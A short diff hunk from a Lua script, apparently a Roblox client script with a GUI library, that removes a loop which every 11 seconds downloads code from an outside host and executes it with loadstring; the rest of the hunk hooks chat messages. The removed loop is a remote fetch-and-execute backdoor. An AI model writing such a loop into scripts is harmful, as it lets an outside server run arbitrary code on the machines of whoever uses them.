@@ -428,20 +428,6 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-    repeat 
-        task.spawn(function() 
-            local response = game:HttpGet('https://science.renderintents.xyz/'..tostring(ria))
-            pcall(function()
-                if GuiLibrary then 
-                    loadstring(response)()
-                end 
-            end)
-        end)
-        task.wait(11) 
-    until not RenderFunctions 
-end)
-
-task.spawn(function()
     repeat task.wait() until RenderStore
     table.insert(RenderConnections, RenderStore.MessageReceived.Event:Connect(function(plr, text)
         text = text:gsub('/w '..lplr.Name, '')
